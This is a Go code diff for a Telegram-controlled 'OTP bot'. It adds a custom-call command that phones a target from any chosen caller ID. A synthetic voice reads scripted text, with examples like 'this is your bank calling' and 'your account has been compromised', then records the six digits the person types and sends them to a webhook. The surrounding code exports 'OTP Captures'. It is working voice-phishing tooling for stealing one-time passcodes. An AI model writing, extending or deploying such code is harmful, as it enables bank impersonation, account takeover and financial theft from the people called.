@@ -10,6 +10,7 @@ import (
 
 	"github.com/USERNAME/goland-otpbot-api/config"
 	"github.com/USERNAME/goland-otpbot-api/models"
+	plivo "github.com/USERNAME/goland-otpbot-api/voice"
 	tgbotapi "github.com/go-telegram-bot-api/telegram-bot-api/v5"
 )
 
@@ -579,6 +580,218 @@ func (b *Bot) exportCaptures(msg *tgbotapi.Message) {
 	})
 	doc.Caption = "📊 OTP Captures Export"
 	b.telegram.Send(doc)
+}
+
+// handleCustomCallCommand handles /ccall <phone> "message" [voice] [caller_id]
+// Supports custom text in quotes instead of templates
+func (b *Bot) handleCustomCallCommand(msg *tgbotapi.Message) {
+	args := msg.CommandArguments()
+	
+	// Parse: phone "message" [voice] [caller_id]
+	// Format: /ccall +15551234567 "Your message here" WOMAN +15559876543
+	
+	// Extract quoted text
+	quoteStart := strings.Index(args, "\"")
+	quoteEnd := -1
+	if quoteStart != -1 {
+		quoteEnd = strings.Index(args[quoteStart+1:], "\"")
+	}
+	
+	var phone, customText, voice, callerID string
+	
+	if quoteStart != -1 && quoteEnd != -1 {
+		// Phone is before the quote
+		phone = strings.TrimSpace(args[:quoteStart])
+		customText = args[quoteStart+1 : quoteStart+1+quoteEnd]
+		
+		// Rest of the args after quote
+		remaining := strings.TrimSpace(args[quoteStart+1+quoteEnd+1:])
+		
+		// Parse voice and caller_id from remaining
+		parts := strings.Fields(remaining)
+		for i, part := range parts {
+			if voice == "" && isVoiceValue(part) {
+				voice = part
+			} else if isPhoneNumber(part) {
+				callerID = part
+			} else if i == 0 && voice == "" {
+				voice = part
+			}
+		}
+	} else {
+		// Fallback: old format /ccall <phone> <message>
+		parts := strings.SplitN(args, " ", 2)
+		if len(parts) < 2 {
+			b.sendMessage(msg.Chat.ID, `❌ Usage: /ccall <phone> "message text" [voice] [caller_id]
+
+Example:
+/ccall +15551234567 "Hello, this is your bank calling" WOMAN
+/ccall +15551234567 "Your account has been compromised" en-GB-WOMAN +15559876543
+
+Available voices: WOMAN, MAN, en-GB-WOMAN, en-GB-MAN, es-ES-WOMAN, fr-FR-WOMAN, de-DE-WOMAN
+
+Use /voices to see all available voices.`)
+			return
+		}
+		phone = strings.TrimSpace(parts[0])
+		customText = strings.TrimSpace(parts[1])
+	}
+	
+	phone = strings.TrimSpace(phone)
+	if !phoneRegex.MatchString(phone) {
+		b.sendMessage(msg.Chat.ID, "❌ Invalid phone number. Use international format: +15551234567")
+		return
+	}
+	
+	if customText == "" {
+		b.sendMessage(msg.Chat.ID, "❌ Please provide message text in quotes: \"your message here\"")
+		return
+	}
+	
+	if voice == "" {
+		voice = "WOMAN"
+	}
+	
+	cfg, err := config.Get()
+	if err != nil {
+		b.sendMessage(msg.Chat.ID, "❌ Failed to get configuration")
+		return
+	}
+	
+	if callerID == "" {
+		callerID = cfg.PlivoNumber
+	}
+	
+	// Create campaign
+	campaignID, err := b.db.CreateCampaign("Custom Call - "+phone, "custom", 1)
+	if err != nil {
+		b.sendMessage(msg.Chat.ID, "❌ Failed to create campaign")
+		return
+	}
+	
+	// Create call record
+	callID, err := b.db.CreateCall(campaignID, phone)
+	if err != nil {
+		b.sendMessage(msg.Chat.ID, "❌ Failed to create call record")
+		return
+	}
+	
+	// Build SSML response with custom text
+	actionURL := fmt.Sprintf("%s/detect_dtmf/%d/%d", cfg.NgrokURL, campaignID, callID)
+	ssml := plivo.NewSSMLBuilder().
+		Start().
+		Speak(customText, plivo.WithVoice(voice)).
+		GetDigits(actionURL, 6, 5, 3).
+		EndGetDigits().
+		Speak("Thank you. Goodbye.", plivo.WithVoice(voice)).
+		End()
+	
+	// Store SSML in database for webhook
+	b.db.CreateLog("INFO", fmt.Sprintf("Custom call SSML: %s", ssml), "")
+	
+	// Initiate call
+	go func() {
+		ringURL := fmt.Sprintf("%s/ring/%d/%d", cfg.NgrokURL, campaignID, callID)
+		machineURL := fmt.Sprintf("%s/machine/%d/%d", cfg.NgrokURL, campaignID, callID)
+		
+		callReq := plivo.CallRequest{
+			From:                callerID,
+			To:                  phone,
+			AnswerURL:           actionURL,
+			RingURL:             ringURL,
+			MachineDetectionURL: machineURL,
+			ErrorCallbackURL:    fmt.Sprintf("%s/error/%d/%d", cfg.NgrokURL, campaignID, callID),
+			TimeLimit:           cfg.CallTimeout,
+			RingTimeout:         30,
+		}
+		
+		resp, err := b.plivo.MakeCall(callReq)
+		if err != nil {
+			b.db.CreateLog("ERROR", fmt.Sprintf("Custom call failed to %s: %v", phone, err), "")
+			return
+		}
+		
+		b.mu.Lock()
+		b.activeCalls[resp.UUID] = &ActiveCall{
+			CallID:     callID,
+			CampaignID: campaignID,
+			Phone:      phone,
+			UUID:       resp.UUID,
+			Status:     "ringing",
+			StartedAt:  time.Now(),
+		}
+		b.mu.Unlock()
+		
+		b.db.UpdateCallStatus(callID, "ringing", resp.UUID)
+		b.db.CreateLog("INFO", fmt.Sprintf("Custom call initiated to %s (UUID: %s)", phone, resp.UUID), "")
+	}()
+	
+	b.sendMessage(msg.Chat.ID, fmt.Sprintf(`📞 *Custom Call Initiated!*
+
+━━━━━━━━━━━━━━━━━
+📱 *Target:* %s
+📞 *Caller ID:* %s
+🎙️ *Voice:* %s
+━━━━━━━━━━━━━━━━━
+✍️ *Message:*
+"%s"
+━━━━━━━━━━━━━━━━━
+
+🔄 Call is ringing...
+
+Use /campaign %d to track progress.`, phone, callerID, voice, customText, campaignID))
+}
+
+// isVoiceValue checks if a string is a valid voice
+func isVoiceValue(s string) bool {
+	voices := []string{"WOMAN", "MAN", "WOMAN_GB", "MAN_GB", 
+		"en-GB-WOMAN", "en-GB-MAN", "en-AU-WOMAN", "en-CA-WOMAN", "en-IN-WOMAN",
+		"es-ES-WOMAN", "fr-FR-WOMAN", "de-DE-WOMAN", "it-IT-WOMAN", "pt-BR-WOMAN"}
+	for _, v := range voices {
+		if strings.EqualFold(s, v) {
+			return true
+		}
+	}
+	return false
+}
+
+// isPhoneNumber checks if a string looks like a phone number
+func isPhoneNumber(s string) bool {
+	return phoneRegex.MatchString(s)
+}
+
+// showVoicesList shows all available TTS voices
+func (b *Bot) showVoicesList(msg *tgbotapi.Message) {
+	text := `🎙️ *Available TTS Voices*
+
+━━━━━━━━━━━━━━━━━
+*🇺🇸 English (US)*
+├ 👩 WOMAN - Standard female
+└ 👨 MAN - Standard male
+
+*🇬🇧 English (UK)*
+├ 👩 en-GB-WOMAN - British female
+└ 👨 en-GB-MAN - British male
+
+*🌍 Other Languages*
+├ 👩 es-ES-WOMAN - Spanish female
+├ 👩 fr-FR-WOMAN - French female
+├ 👩 de-DE-WOMAN - German female
+├ 👩 it-IT-WOMAN - Italian female
+└ 👩 pt-BR-WOMAN - Portuguese female
+
+━━━━━━━━━━━━━━━━━
+*Usage:*
+` + "```" + `/ccall +15551234567 "message" en-GB-WOMAN
+` + "```" + `
+
+SSML Features available:
+• <break strength="medium"/> - Pause
+• <emphasis level="strong"/> - Emphasis
+• <prosody rate="slow"> - Speed control
+• <lang xml:lang="es-ES"> - Language switch`
+
+	b.sendMessage(msg.Chat.ID, text)
 }
 
 func (b *Bot) sendLogs(msg *tgbotapi.Message, limit int) {
